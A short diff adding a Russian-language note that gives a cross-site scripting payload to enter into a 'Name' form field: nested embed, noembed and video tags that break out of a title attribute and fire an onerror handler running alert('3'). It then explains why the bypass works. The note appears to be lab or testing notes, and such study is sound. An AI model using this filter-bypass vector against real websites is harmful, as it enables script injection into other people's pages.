@@ -1,0 +1,4 @@
+В поле "Имя" вводим следующий код:
+<embed><noembed><code><video title="</noembed>><video src onerror=alert("3")></code></noembed></embed>
+
+После title=" идет закрытие, что вызывает ошибку и ведет к выполнению сценария video src onerror в котором ужу заложена команда
